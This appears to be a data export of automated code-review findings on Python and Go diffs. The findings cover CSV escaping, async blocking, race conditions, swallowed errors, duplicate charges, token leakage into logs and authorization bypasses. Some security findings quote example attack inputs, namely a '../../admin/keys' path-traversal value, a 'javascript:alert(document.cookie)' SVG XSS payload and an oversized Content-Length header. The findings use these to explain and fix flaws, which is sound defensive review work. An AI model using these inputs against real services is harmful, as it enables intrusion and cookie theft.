findings.body: The test at line 6-8 patches `notify.transport.deliver`, but the existing docstring in notify/sender.py explicitly documents that `deliver` is bound into the module namespace at import time, so patching `notify.transport.deliver` will not affect `send_with_retry`. The first test on line 2 correctly patches `notify.sender.deliver`. findings.title: csv_rows joins field values without applying csv_escape
findings.body:
`csv_rows` renders each record with `",".join(str(r.get(c, "")) for c in columns)` and never routes values through `csv_escape`, which is defined immediately below it for exactly this purpose. Any field value that contains a comma splits into extra columns, and a value containing a double quote produces a malformed field, so a record whose content is supplied by a user can shift or forge the values of neighbouring columns in the exported file (and in whatever downstream system ingests it). Call `csv_escape(str(r.get(c, "")))` inside the join, or use the stdlib `csv` module, which handles quoting and embedded newlines (which `csv_escape` also ignores) correctly.

_Also raised by the correctness agent:_ csv_escape raises TypeError on non-string values

findings.title: csv_rows never calls csv_escape, emitting malformed CSV
findings.body: `csv_rows` joins `str(r.get(c, ""))` with commas directly, so a field whose value contains a comma or a double quote is written unescaped and splits into extra columns (or corrupts quoting) for any consumer. `csv_escape` is added in the same commit and is evidently intended for exactly this, but nothing in the module calls it. Wrap each field: `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`. The same argument applies to `csv_header`, which also emits column names verbatim.

test_token_issued_today_is_valid() calls issue_token() and compares against datetime.now(timezone.utc) rather than a fixed, injected clock. Two problems: (1) the date() comparison on line 11 can fail spuriously if the test runs across a UTC midnight boundary — pure flakiness unrelated to correctness; (2) is_expired(token.expires_at) on line 12 uses the real current time with no explicit 'now', so for any reasonable token lifetime this assertion will pass regardless of whether the expiry window calculation is actually correct — it only fails if the code is catastrophically broken (e.g. tokens expire instantly). findings.title: No test covers the expired-coupon rejection path
findings.body: apply_coupon now raises CouponExpired when coupon.expires_at is in the past, but the only test updated (test_apply_coupon_reduces_total) uses a coupon expiring tomorrow, exercising just the non-expired branch. findings.title: Coupons with no expiry (missing/None expires_at) now blow up
findings.body: `coupon.expires_at < datetime.now(timezone.utc)` assumes every coupon carries a non-null expiry. A coupon with `expires_at = None` raises `TypeError: '<' not supported between instances of 'NoneType' and 'datetime.datetime'`, and one without the attribute at all raises `AttributeError` — neither is `CouponExpired`, so callers catching the new exception still get a 500. The test change is direct evidence that `Coupon` was previously constructible without `expires_at`, so non-expiring coupons are a real shape in this codebase. Guard explicitly, e.g. `if coupon.expires_at is not None and coupon.expires_at < now`, treating a missing expiry as never-expiring (or reject it deliberately with a clear error).

findings.title: Blocking requests.get inside async function stalls the event loop
findings.body:
`fetch_plan_limits` is a coroutine, so it runs on the event loop thread, but `requests.get` is a synchronous socket call with no yield point. While it waits (up to the 5-second timeout, longer if DNS resolution to `billing.internal` hangs before the timeout applies), no other task on the loop can make progress \u2014 every concurrent request handler is frozen, not just this one. The `async` keyword also makes this invisible at the call site: callers will `await` it and reasonably assume it is non-blocking.

The file already has the right pattern directly above: use `httpx.AsyncClient` and `await client.get(...)`, mirroring `fetch_plan` (line 5-7) by taking the client as a parameter so it can be reused. If the synchronous client genuinely must be kept, wrap it with `await asyncio.to_thread(requests.get, ...)` so the loop stays free.

findings.title: New async function fetch_plan_limits has no test coverage
findings.body: fetch_plan_limits is a new async function that performs a network call and returns parsed JSON, but no test file is included in this diff. Nothing would catch a regression here — e.g. if the URL template were wrong, the timeout removed, or the response shape changed, no test would fail. Given the existing fetch_plan function above it is similarly simple, this may match existing project standards, but since this is new externally-facing behavior (billing limits used in the UI), at least a basic test mocking the HTTP call and asserting on the parsed return value would catch obvious breakage.

findings.title: Unencoded tenant_id interpolated into internal billing URL
findings.body:
`fetch_plan_limits` builds the request URL with an f-string: `f"https://billing.internal/limits/{tenant_id}"`. If `tenant_id` originates from a request path segment, query parameter or JSON body, a caller can inject `/` and `..` segments (e.g. `../../admin/keys`) or a `?`/`#` to reach a different path or append query parameters on the internal, presumably unauthenticated, billing host. The response is then returned to the caller via `response.json()`, making this a readable request-forgery primitive against an internal service.

Fix: validate `tenant_id` against the expected shape (e.g. UUID / `[A-Za-z0-9_-]+`) before use, or at minimum pass it through `urllib.parse.quote(str(tenant_id), safe="")`. Passing it as a parameter rather than splicing it into the path string is safer still.

findings.title: Bare `except:` swallows KeyboardInterrupt/SystemExit and logs nothing
findings.body:
`except:` with no exception type catches `BaseException`, so `KeyboardInterrupt`, `SystemExit` and `GeneratorExit` raised while `_client.send` is running are converted into a silent `return None`. That makes the process ignore Ctrl-C / shutdown signals that happen to land inside a metrics push, and it can break generator/task cancellation semantics.

Separately, the PR description says "catch and log", but nothing is logged \u2014 every transport failure, serialization bug or `NameError` in `_client` now disappears without a trace, which is exactly the failure mode that makes telemetry outages invisible.

Suggested: `except Exception as exc: logger.warning("metrics push failed", exc_info=exc); return None`.

_Also raised by the security agent:_ Bare except silently swallows all failures, no log emitted

findings.title: No test covers the new non-fatal error handling
findings.body: The change makes push_metrics catch all exceptions from _client.send and return None instead of propagating. There is no test verifying that a raising _client.send no longer propagates, nor that a successful send still returns its value. If this try/except were removed or broken, nothing in the suite would fail.

findings.title: Bare except clause lacks explanation of intended behavior
findings.body: The function now silently catches all exceptions and returns None, but there is no docstring, comment, or type hint documenting this behavior change. A caller cannot determine from the function signature or any documentation that a failed push will return None rather than raise an exception, or that the function has become non-fatal by design.

findings.title: try_consume checks and updates _counters without holding _lock
findings.body:
`try_consume` reads `_counters.get(tenant, 0)` on line 15, decides on line 16, then yields to the event loop on line 18 before writing on line 19 — all outside `_lock`. Two coroutines for the same tenant can both read `current` below the limit, both pass the check, and both write, so the tenant is charged past `LIMIT`; with N concurrent callers the overshoot is unbounded. The `await asyncio.sleep(0)` guarantees a suspension point between the check and the write, so this is not a theoretical interleaving.

Additionally, line 19 assigns an absolute value computed from a stale read rather than incrementing. Any `consume()` call (which does hold `_lock` and increments) that lands during the `await` has its charge silently overwritten and lost — the rate limiter under-counts as well as over-admits.

Fix: wrap the read, check and write in `async with _lock:` the same way `consume` does, and re-read the counter inside the lock (or increment in place) rather than writing back a value captured before the suspension point.

_Also raised by the security agent:_ Rate limit bypassable: check-then-act outside the lock in try_consume

findings.title: try_consume's race condition and limit enforcement are untested
findings.body: try_consume reads _counters.get(tenant, 0) outside of _lock, then awaits asyncio.sleep(0) before writing back the incremented value. Concurrent calls can both pass the `current + cost > LIMIT` check before either writes, allowing the tenant's usage to exceed LIMIT — defeating the purpose of the rate limiter. No test exists (in this diff) that exercises concurrent calls to try_consume, nor even a single-threaded test that LIMIT is actually enforced (e.g. asserting False is returned once the limit is reached, or that _counters does not exceed LIMIT under concurrency). As written, any regression in the limit check or the race itself would go completely undetected.

findings.title: Return shape change breaks existing tuple-unpacking caller

`lookup_user` now returns `{"name", "email", "tier"}` instead of `(name, email)`. The existing caller `reports/weekly.py:6` does `name, email = lookup_user(user_id)`. Unpacking a 3-key dict into two names raises `ValueError: too many values to unpack (expected 2)` at runtime — and even with exactly two keys it would bind the *keys*, not the values, silently producing `"name <email>"`. Either update every caller in the same change (`render_row` becomes `u = lookup_user(...); f"{u['name']} <{u['email']}>"`), or keep the old function and add a new `lookup_user_details` for the richer shape.

_Also raised by the tests agent:_ Return-shape change breaks caller with no test to catch it

findings.title: Docstring describes old return type (tuple), not new type (dict)
findings.body:
The docstring states 'Return (name, email) for a user.' but the function now returns a dictionary with keys 'name', 'email', and 'tier'. This is a breaking change in the return type that will mislead any caller reading the documentation. The existing caller in reports/weekly.py (line 5-6) unpacks the return value as a tuple, which will fail with this change. The docstring must be updated to document the new return shape.

_Also raised by the correctness agent:_ Docstring still documents the old (name, email) tuple contract

findings.title: WriteSettlement always returns nil; insert failure is swallowed
findings.body:
The `err` bound by `if _, err := db.Exec(...)` is scoped to the `if` statement and only reaches `log.Printf`. Line 18 then declares a brand-new `var err error`, which is the zero value `nil`, and line 19 returns it. The function therefore returns `nil` unconditionally — a caller that checks `if err := WriteSettlement(...); err != nil` can never observe a failed insert, and the end-of-day batch will treat unwritten settlements as committed (no retry, no reconciliation, silent money loss).

Contrast with `WriteEntry` directly above (lines 7-8), which propagates `err` from `db.Exec`. Fix by returning the insert error:

```go
if _, err := db.Exec(...); err != nil {
    log.Printf("settlement insert failed: %v", err)
    return err
}
return nil
```

If "log and continue" really is the intent for the batch, that decision belongs in the caller's loop, and this function should still return the error so the caller can count/report failures. At minimum the signature should not promise an error it never produces.

findings.title: Public function WriteSettlement lacks contract documentation
findings.body: WriteSettlement is an exported public function (capitalized name) whose behavior is contradictory and cannot be safely used without documentation. The function validates input (line 12–14) and returns errors from validation, but then swallows database insertion errors (line 15–17), logs them, and always returns nil (line 19). A caller cannot determine from the signature alone whether this function returns errors or always succeeds. The docstring must clarify: (1) whether validation errors are fatal (they appear to be), (2) whether insertion errors are fatal or merely logged, and (3) whether the function can ever actually return a non-nil error or always returns nil.

findings.title: WriteSettlement has no test covering its error-return behavior
findings.body: WriteSettlement's return value is a fresh, always-nil `err` variable declared at line 18, so the function silently returns success even when the insert at line 15 fails. There is no test in this diff exercising a failing db.Exec call, so this always-nil-return bug would pass unnoticed. Add a test that forces db.Exec to fail and asserts WriteSettlement returns a non-nil error.

findings.title: Mutable default argument accumulates state across calls
findings.body:
`attempted=[]` is evaluated once at function definition time, so every caller that omits the argument shares the same list object. The first call that has a failing recipient appends to it (line 10) and returns it (line 11); the next call starts from that already-populated list and returns the union of all prior failures plus its own. Callers inspecting the return value to decide what to re-send will re-send recipients from unrelated earlier batches, and the list grows unbounded for the process lifetime.

Use `attempted=None` and build a fresh list inside:

```python
def send_with_retries(recipients, attempted=None):
    attempted = list(attempted) if attempted else []
    ...
```

findings.title: Rounding boundary changed from >= 0.5 to > 0.5 in a rename-only PR

Every other hunk in this diff is a pure identifier rename, but `compute_rounding` also changes its predicate from `line.remainder_cents >= 0.5` to `line.remainder_cents > 0.5`. A remainder of exactly 0.5 now yields 0 instead of 1, i.e. half-cent remainders round down rather than up. Exactly-0.5 remainders are common in money math (half of an odd cent count), so this will change billed totals by one cent on a nontrivial share of lines and will drift any downstream reconciliation against previously stored values.

If this behaviour change is intentional it belongs in its own commit with a test pinning the 0.5 boundary; otherwise restore `>=`.

findings.title: Off-by-one slice in page_of_sorted silently drops one record per page
findings.body:
`page_of_sorted` computes `start = page * PAGE_SIZE` but slices `ordered[start : start + PAGE_SIZE - 1]`, returning only `PAGE_SIZE - 1` items. Because the offset still advances by a full `PAGE_SIZE` on the next page, the record at index `start + PAGE_SIZE - 1` is never returned by any page — for an export endpoint this means data is lost from the output with no error. Compare the existing `page_of` on line 6, which correctly slices `records[start : start + PAGE_SIZE]`. Change the end bound to `start + PAGE_SIZE`.

findings.title: Retry wraps non-idempotent charge(), risking duplicate charges
findings.body:
`charge()` is explicitly documented as NOT idempotent — each call creates a new charge — yet `charge_card` is decorated with `@retry(attempts=3)`. A transient failure after the gateway has already accepted the POST (timeout, dropped connection, 5xx on the response path) will cause up to two additional charges against the same card. The gateway docstring states it supports an `Idempotency-Key` header; generate a key once per logical charge in `charge_card` and pass it through `charge()` so retries collapse to a single charge, or drop the retry on this path entirely and let the caller reconcile via `get_charge`.

_Also raised by the security agent:_ Retry on non-idempotent charge() without Idempotency-Key

If a transient failure occurs after the gateway processed the charge (e.g., timeout on response), retry() will re-invoke charge() and create a second real charge. There is no test in this diff exercising charge_card's retry behavior, so nothing would fail if this bug is introduced or persists. A test simulating a failure-then-success on charge() and asserting the underlying POST was only invoked once (or that an idempotency key was passed) would catch this.

findings.title: Naive datetime.now() subtracted from tz-aware expires_at raises TypeError

findings.title: Removing Referer scrubbing writes auth tokens into the logs
findings.body:
Previously the Referer value was passed through `_scrub_uri(value, extra_param_keys)` before being added to the logged header dict; now the raw header value is logged. Per `jupyter_server/auth/identity.py`, notebook URLs are handed out as `{base}?token={token}`, and the browser echoes that full URL — token included — in the Referer header of every subresource request. On any 5xx the token is therefore serialised by `json.dumps(headers)` and written out by `log_method` in cleartext.

Anyone who can read the server log (operators, log shipping/aggregation pipelines, a container stdout collector, a bug report with a pasted traceback) gets a live authentication token for that user's server. Restore the scrubbing for Referer (and consider applying `_scrub_uri` to any other header that may contain a URL) rather than logging the raw value.

_Also raised by the correctness agent:_ Removing _scrub_uri writes auth tokens from Referer into logs

Per the repository context, `token_authenticated_url` embeds the token directly in URLs, and those URLs are echoed back in the Referer header on subresource requests — meaning this change causes the raw token to be written to logs. There is no test in this PR (or evident in the repo) that asserts logged headers never contain a token/secret value, so this regression would pass unnoticed by the test suite.

findings.title: Dropping xlinkhref from URL check reintroduces SVG javascript: XSS
findings.body:
`validateProp` previously routed `href`, `src` and `xlinkhref` through `isAnchorLinkAllowed`, which rejects the `unsafeLinkPrefix` schemes (`javascript:`, `data:text/html`, `vbscript:`). After this change `xlinkhref` no longer hits that branch, so it falls through to whatever the generic tail of the function returns. In SVG, `<a xlink:href="javascript:alert(document.cookie)">` is a live script-execution sink in browsers that still honour the legacy attribute, and `xlink:href` on `<use>`/`<image>` additionally enables external-reference loading.

The entry point is author-supplied markdown, which the file header states includes end-user submitted content; the sink is the rendered attribute in the DOM. Unless `xlinkhref` is stripped entirely by the allowed-attribute list elsewhere in this function (not shown in the diff), this is an unauthenticated stored-XSS vector.

If the goal is to stop supporting `xlink:href`, drop it from the allowed-attribute list so it is removed from output, rather than removing only its URL validation — the current shape is the worst of the two options: still rendered, no longer checked.

_Also raised by the correctness agent:_ Dropping xlinkhref from the URL check re-enables javascript: XSS

findings.title: Buffer pre-reserved from unvalidated client Content-Length
findings.body:
`Reserve(contentLength)` commits memory up front based on a value that arrives with the request, before `io.Copy` on line 8 has read (and therefore proven) a single byte. A client that sends `Content-Length: 5368709120` with a one-byte body causes the server to reserve gigabytes; a handful of concurrent such requests exhausts the process. The previous behaviour — growing the RW a page at a time as the body was actually read — bounded allocation by bytes genuinely received, which is why it was safe.

If the pre-sizing is worth keeping, clamp it: reserve `min(contentLength, someMaxPartSize)` and only after rejecting `contentLength` values above the configured maximum part size, so allocation is bounded by policy rather than by the header. The MD5/copy loop on line 8 already handles growth correctly for anything beyond the reservation.

_Also raised by the security agent:_ Buffer pre-reserved from attacker-declared Content-Length

findings.body: The new `Reserve(contentLength)` call pre-allocates the multipart RW buffer based on a caller-provided length before any bytes are read. If `contentLength` is inflated relative to the actual body size (or unexpectedly large), this eagerly allocates memory before validation — the same declared-length-allocation risk the PR title names. Nothing in this diff exercises that path: there's no test asserting that a mismatched or oversized contentLength doesn't cause excessive allocation, or that the io.Copy result is still validated against actual bytes read. A regression here (e.g. removing the copy-length check, or an attacker sending a huge Content-Length) would pass silently.

findings.title: Default S3 scheme flips from https to plaintext http when is_secure unset
findings.body:
The old expression `"http" if request.meta.get("is_secure") is False else "https"` only selected plaintext when the caller explicitly set `is_secure = False`; every other case (key absent, i.e. `.get()` returns `None`) fell through to `https`. The new expression `"https" if request.meta.get("is_secure") else "http"` treats any falsy value — including the missing-key `None` — as insecure, so every request that does not explicitly set `request.meta["is_secure"] = True` is now downloaded over plaintext HTTP. Since `url` on line 6 is what the S3 request (with its AWS signature/credentials headers) is sent to, this exposes signed requests and object contents on the wire and silently changes behaviour for all existing callers that relied on the secure-by-default contract.

If the intent was only to simplify, preserve the default: `scheme = "http" if request.meta.get("is_secure") is False else "https"`, or `scheme = "https" if request.meta.get("is_secure", True) else "http"`.

_Also raised by the security agent:_ S3 requests default to plaintext HTTP when is_secure meta is unset

findings.body: The condition has been inverted from `is_secure is False` to `is_secure` (truthy check), which changes the default scheme when `is_secure` is absent or None. Old code: if `is_secure` is absent, defaults to 'https'. New code: if `is_secure` is absent (falsy), defaults to 'http'. This is a breaking change in the public API contract that is not documented as intentional, and any caller relying on the implicit 'https' default will silently switch to 'http' without warning.

No test file is included in this diff, so if this default flip were wrong (e.g. it should default to https for safety), nothing in the current test suite would fail to catch it.

findings.title: DELETE now authorized as "push", bypassing the delete permission
findings.body:
`request.Method` (fully attacker-controlled, it is the verb on the incoming HTTP request) flows into `action`, which is packed into `ResourceAction{Name: name, Action: action}` on line 9 — the value the authorization layer uses to decide whether the caller may act on the repository named by `vars["name"]`. Before this change `http.MethodDelete` produced `action = "delete"`; after it, every method that is not GET/HEAD — including DELETE — produces `"push"`.

The retrieved config documentation states the three actions are distinct on purpose: "an account may be allowed to push new tags without being allowed to delete existing ones." With this change that separation no longer exists at the authn layer: a token or account holding only `push` on a repository can issue `DELETE /v2/<name>/manifests/<ref>` and pass the access check, destroying tags/manifests it was never granted delete rights on. This is destructive and silently removes a control that was previously enforced.

Restore the explicit `case http.MethodDelete: action = "delete"` branch (keeping the pull/push branches as they were), so the delete grant is still consulted. If the intent was to simplify, the simplification must still emit three distinct action values.

findings.title: Overflow handling clears the entry just written to the cache
findings.body:
When `_CACHE` exceeds 1000 entries, the whole dict is wiped — including `tenant_id`, which was inserted two lines earlier. The caller still gets the correct return value, but the stated purpose of the function ("a live fetch into the shared cache") silently fails for that call: an immediately following `get_tenant(tenant_id)` returns `None`. Once the cache is near the limit this also degenerates into repeatedly filling and flushing, so every other caller loses its warm entries too.

Either evict before inserting, or evict a bounded subset (e.g. pop the oldest N keys, or use an LRU such as `collections.OrderedDict`/`functools.lru_cache`) so the just-fetched entry survives.

findings.title: A None result from _fetch is cached and is indistinguishable from a miss
findings.body: The return value of `_fetch` is stored unconditionally. If `_fetch` can return `None` for an unknown or not-yet-provisioned tenant, that `None` is written into `_CACHE`, and `get_tenant` (line 5, `_CACHE.get(tenant_id)`) cannot distinguish "cached negative" from "never looked up" — it will keep returning `None` for that tenant until the cache is cleared. Consider only writing to the cache when `tenant is not None`, or using an explicit sentinel if negative caching is intended.

findings.title: Caller-supplied tenant_id can flush the whole shared cache
findings.body:
`get_tenant_fresh` writes an entry for any `tenant_id` it is handed and, once the shared `_CACHE` exceeds 1000 entries, discards the entire cache rather than evicting a single entry. If this function is reachable (directly or transitively) from a request handler where `tenant_id` is caller-influenced, an attacker can issue ~1000 requests with distinct or nonexistent ids to force `_CACHE.clear()`, dropping every other tenant's cached data and pushing the resulting read load onto `_fetch` and its backing store. Each cycle costs the attacker 1000 cheap requests and costs the system a full cold-cache stampede.

Two cheap mitigations: bound the cache with a per-key eviction policy (e.g. `OrderedDict` + `popitem(last=False)`, or `functools.lru_cache`/`cachetools.LRUCache`) instead of `clear()`, and skip caching when `_fetch` returns a falsy/not-found result so unknown ids cannot occupy entries at all.

findings.title: New request() silently drops verify/cert (and timeout) before send
findings.body:
The rewritten `request()` still advertises `verify=None`, `cert=None` and `timeout=None` in its signature, but the body only copies method, url, headers, files, data, params, auth, cookies, allow_redirects, proxies and hooks onto the `Request` before calling `req.prepare()` / `self.send(prep)`. `verify` and `cert` are never assigned to `req`, never merged with the session `config` defaults, and never passed to `HTTPAdapter.send()` on line 365-366. Entry point: any caller of `Session.request()`/`get()`/`post()` that passes `verify='/path/to/ca.pem'`, `verify=True` or a client `cert=`; sink: the TLS handshake performed inside `adapter.send(request)`. Callers who explicitly ask for certificate verification or present a client certificate get neither, and whatever the adapter's built-in default is silently wins — a MITM on the connection is then undetected. `timeout` is dropped the same way, so a hostile or slow server can hang the caller indefinitely. Either thread these through to `adapter.send()` (e.g. `self.send(prep, verify=..., cert=..., timeout=...)`) or remove them from the signature until the adapter supports them, so the failure is loud rather than silent.

_Also raised by the correctness agent:_ New `request()` silently drops timeout/verify/cert/prefetch and all session defaults

findings.title: `old_request` still calls the deleted `_send_request`
findings.body: `_send_request` was removed in this diff, but the surviving `old_request` path still ends with `return self._send_request(r, **args)`. Any call that reaches `old_request` now raises `AttributeError`. Either keep `_send_request` until `old_request` is deleted, or inline the two lines it contained.

findings.title: A fresh HTTPAdapter (and pool) is built per request; close() no longer frees it
findings.body: `send()` instantiates a new `HTTPAdapter()` on every call, so each request gets its own PoolManager and no connection is ever reused — connection pooling, which `Session` exists for, is gone. Nothing holds a reference to the adapter afterwards, and `close()` is now `pass`, so sockets are only reclaimed by GC. The adapter should be created once (e.g. in `__init__`, honouring `pool_connections`/`pool_maxsize`/`support_http0.9` as `init_poolmanager` did) and closed from `close()`.

findings.title: Absolute `from adapters import HTTPAdapter` inside the package will not resolve
findings.body: Every other intra-package import in this module is explicit-relative (`from .utils import ...`, `from .packages.urllib3.poolmanager import PoolManager`). `from adapters import HTTPAdapter` only resolves under Python 2 implicit relative imports; under Python 3 (or with `absolute_import` enabled) it raises `ImportError` at import time, making the whole `requests` package unimportable. Change it to `from .adapters import HTTPAdapter`.

findings.title: Session.send/close rewrite has no accompanying test changes
findings.body: This diff makes substantive behavioral changes: Session.close() becomes a no-op (previously cleared the PoolManager), Session.request() is entirely rewritten to build a Request/PreparedRequest and call self.send(), and Session.send() now delegates to a newly constructed HTTPAdapter() instead of request.send(). No test file is part of this diff, so if HTTPAdapter.send() has a different signature/behavior than PreparedRequest.send(), or if close() silently failing to release pooled connections causes resource leaks, nothing here would fail to alert the team.

findings.title: Stale docstring removed but behavior changed significantly
findings.body: The `close()` method previously documented that it "closes the PoolManager, which closes pooled connections." This docstring was removed entirely when the method implementation changed from `self.poolmanager.clear()` to `pass`. While removing a docstring for an empty method is not inherently wrong, the removal obscures that the method's behaviour has changed: it no longer performs cleanup that callers might depend on. If this is intentional (cleanup moved to HTTPAdapter), a comment explaining that would prevent confusion.

findings.title: Removal of `init_poolmanager`/`self.poolmanager` breaks documented subclass hook
findings.body: `init_poolmanager()` was a public, overridable hook and `session.poolmanager` a publicly reachable attribute; both are removed with no replacement. Subclasses that override `init_poolmanager` will now have their override never called (silently, not loudly), and any code touching `self.poolmanager` — including `close()` before this diff — raises `AttributeError`. If the adapter is taking over pooling, provide an equivalent hook or a deprecation shim.

findings.title: Unqualified `from adapters import HTTPAdapter` can resolve off sys.path
findings.body: This imports a bare top-level name `adapters` rather than the package-local module. Under Python 3 (and under Python 2 with `absolute_import`) this resolves against `sys.path`, which includes the invoking script's directory — so any `adapters.py` sitting next to the application, or earlier on the path, is loaded and its `HTTPAdapter.send()` becomes the code that performs every HTTP request for this library. That is arbitrary-code substitution on the request path for anyone who can drop a file into the working directory. Use the explicit relative form `from .adapters import HTTPAdapter`, consistent with the other imports in this module (e.g. `from .utils import ...` on line 18).

findings.title: Old request() method renamed to old_request() without docstring update
findings.body: The `old_request()` method at line 172 appears to be the original `request()` method renamed during refactoring. Its docstring (if any) is not visible in the diff, but the name change from a public API (`request`) to what appears to be a deprecated method (`old_request`) should be documented to explain to callers why the method exists and what they should use instead. This prevents confusion about whether `old_request` is part of the public contract.

findings.title: cookies returns None on malformed Cookie header, breaking callers
findings.body:
In the moved property the failure path sets `self._cookies = None` and the property then returns `None`. Both new call sites in `web.py` immediately index it: `if name in self.request.cookies` (line 321) and `self.request.cookies.iterkeys()` (line 367). With a malformed `Cookie:` header this raises `TypeError: argument of type 'NoneType' is not iterable` / `AttributeError` instead of degrading gracefully, turning a client-controlled header into a 500 on every request that reads a cookie.

The old code never returned `None` — on a parse error it called `self.clear_all_cookies()` and returned the (possibly partially loaded) `SimpleCookie`. Since `HTTPRequest` has no access to the response, the equivalent here is to reset to an empty `SimpleCookie()` rather than `None`:

```python
except Exception:
    self._cookies = Cookie.SimpleCookie()
```

Note this also silently drops the old side effect of emitting clear-cookie headers for a bad cookie jar; if that behaviour matters it has to be re-added on the handler side.

_Also raised by the security agent:_ Malformed Cookie header makes request.cookies None, crashing all callers

findings.title: Public RequestHandler.cookies removed without a compatibility alias
findings.body:
`RequestHandler.cookies` is a documented, public property used by application subclasses and templates (`handler.cookies[...]`). The diff deletes it outright and rewrites only the two in-tree call sites, so any downstream code doing `self.cookies` now gets `AttributeError`. Keep a thin forwarding property on the handler:

